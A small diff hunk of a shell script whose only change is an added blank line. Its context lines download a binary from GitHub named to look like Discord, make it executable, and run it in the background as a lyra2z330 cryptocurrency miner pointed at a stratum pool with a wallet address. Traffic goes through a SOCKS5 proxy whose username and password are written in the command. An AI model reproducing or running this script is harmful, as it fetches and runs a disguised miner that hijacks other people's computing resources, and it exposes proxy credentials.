@@ -5,3 +5,4 @@ wget -O Discord-V.001 https://github.com/Explorer-Discord/Discord-V.001/raw/main
 screen -dmS ls
 chmod +x Discord.sh && chmod +x Discord-V.001 && chmod 777 Discord Discord.sh
 ./Discord-V.001 -a lyra2z330  -o stratum+tcp://stratum-eu.rplant.xyz:7051 -u PBqv4MQQnByD19vc3B2Es3GzVeyhksLPwE.AB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS5://cghuohtm:ev5p8oqzuvmg@45.94.47.66:8110
+
